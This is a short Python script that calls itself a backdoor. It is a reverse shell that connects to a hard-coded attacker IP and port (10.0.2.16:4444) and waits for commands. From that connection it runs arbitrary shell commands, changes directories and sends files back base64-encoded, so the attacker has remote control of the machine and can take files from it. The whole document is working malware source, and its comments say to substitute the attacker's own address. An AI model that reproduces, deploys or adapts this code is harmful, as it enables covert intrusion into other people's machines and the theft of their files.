#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
        self.connection.connect((ip, port)) # Connect to the attacker's IP and port

    def reliable_send(self, data):
        # This function sends data to the connected client
        json_data = json.dumps(data)
        self.connection.send(json_data) # Convert the data to JSON format and send it to the client

    def reliable_receive(self):
        # This function receives data from the connected client
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) # Receive data from the client
                return json.loads(json_data) # Convert the JSON data back to Python format
            except ValueError:
                continue
            # If there is a ValueError, continue receiving data until the entire JSON object is received

    def change_working_directory_to(self, path):
        os.chdir(path) # Change the working directory to the specified path
        return "Changed working directory to " + path


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()) # Read the contents of the file at the specified path

    
    def execute_system_command(self, command):
        # Execute the command and return the output
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive() # Receive a command from the attacker
            if command[0] == "exit":
                self.connection.close() # Close the connection if the command is "exit"
                exit()
            
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])

            elif command[0] == "download":
                command_result = self.read_file(command[1])
                # Read the contents of the file at the specified path

            else:
                command_result = self.execute_system_command(command)


            self.reliable_send(command_result) # Send the command result back to the attacker
        
# Create a Backdoor object with the attacker's IP and port

my_backdoor = Backdoor("10.0.2.16", 4444) # Replace with your attacker's IP and port
my_backdoor.run() # Run the backdoor


